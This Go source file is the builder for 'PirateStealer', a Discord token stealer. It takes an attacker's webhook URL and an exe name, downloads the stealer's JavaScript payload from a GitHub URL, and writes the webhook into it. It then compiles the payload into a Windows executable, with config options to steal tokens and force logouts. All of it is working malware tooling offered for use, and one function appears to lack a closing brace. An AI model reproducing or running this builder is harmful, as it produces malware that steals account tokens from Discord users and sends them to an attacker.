package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/bytixo/PirateStealer/Builder/logger"
)

var (
	webhook string
	cfg     Config
	name    string
)

type Config struct {
	Platform     []string `json:"platform"`
	Logout       string   `json:"logout"`
	StealToken   string   `json:"steal-token"`
	InjectNotify string   `json:"inject-notify"`
	LogoutNotify string   `json:"logout-notify"`
	InitNotify   string   `json:"init-notify"`
	EmbedColor   string   `json:"embed-color"`
}

func init() {
	cfg = loadConfig("config.json")
	logger.Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Logout: %s StealToken: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
		fmt.Sprint(cfg.Platform)+"\n",
		cfg.Logout+"\n",
		cfg.StealToken+"\n",
		cfg.InjectNotify+"\n",
		cfg.LogoutNotify+"\n",
		cfg.InitNotify+"\n",
		cfg.EmbedColor+"\n"))
}

func main() {
	logger.Info("Enter Webhook URL:")
	fmt.Scanln(&webhook)
	logger.Info("Enter exe name:")
	fmt.Scanln(&name)
	switch {
	case !strings.Contains(name, ".exe"):
		name = name + ".exe"
	}
	buildPlatform()
}

func loadConfig(file string) Config {
	var config Config
	cfg, err := os.Open(file)
	if err != nil {
		logger.Error(err.Error())
	}
	defer cfg.Close()

	jsonP := json.NewDecoder(cfg)
	jsonP.Decode(&config)
	return config
}

func cfgChanges(data []byte) string {
	d := string(data)
	// Logout
	switch cfg.Logout {
	case "instant":
		d = replace(d, "%LOGOUT%1", "instant")
	case "true":
		d = replace(d, "%LOGOUT%1", "delayed")
	case "false":
		d = replace(d, "%LOGOUT%1", "false")
	default:
		d = replace(d, "%LOGOUT%1", "instant")
	}
	// StealToken
	switch cfg.StealToken {
	case "true":
		d = replace(d, "%STEAL%1", "true")
	case "false":
		d = replace(d, "%STEAL%1", "false")
	default:
		d = replace(d, "%STEAL%1", "false")
	}
	// InjectNotify
	switch cfg.InjectNotify {
	case "true":
		d = replace(d, "%INJECTNOTI%1", "true")
	case "false":
		d = replace(d, "%INJECTNOTI%1", "false")
	default:
		d = replace(d, "%INJECTNOTI%1", "false")
	}
	// LogoutNotify
	switch cfg.LogoutNotify {
	case "true":
		d = replace(d, "%LOGOUTNOTI%1", "true")
	case "false":
		d = replace(d, "%LOGOUTNOTI%1", "false")
	default:
		d = replace(d, "%LOGOUTNOTI%1", "false")
	}
	// INITNOTI
	switch cfg.InitNotify {
	case "true":
		d = replace(d, "%INITNOTI%1", "true")
	case "false":
		d = replace(d, "%INITNOTI%1", "false")
	default:
		d = replace(d, "%INITNOTI%1", "false")
	}
	// Embed Color
	switch {
	case cfg.EmbedColor != "3447704":
		d = replace(d, "%MBEDCOLOR%1", cfg.EmbedColor)
	default:
		d = replace(d, "%MBEDCOLOR%1", "3447704")
	}

	d = replace(d, "da_webhook", webhook)
	return d
}

func replace(s, old, new string) string {
	return strings.Replace(s, old, new, -1)
}

func buildPlatform() {
	for _, platform := range cfg.Platform {
		switch platform {
		case "windows":

			logger.Info("Building Windows")
			wincode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index-win.js")
			err := ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
			if err != nil {
				logger.Fatal("Error writing to file", err)
			}
			time.Sleep(time.Second)
			versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1", "win32-x64-12.9.1"}
			v := versions[rand.Intn(len(versions))]
			t := fmt.Sprintf(`-t %s`, v)
			logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
			_, err = exec.Command("nexe", "-t", v, "-o", name, "index-win.js").Output()
			if err != nil {
				logger.Fatal("Error while compiling", err)
				time.Sleep(5 * time.Second)
				os.Exit(1)
			}
			logger.Info("Windows Executable has been built with your webhook")
	}
}

func getCode(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		logger.Fatal(err)
	}

	httpClient := http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		logger.Fatal(err)
	}
	defer resp.Body.Close()
	r, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logger.Error(err)
	}
	//replace webhook
	c := cfgChanges(r)
	return c
}
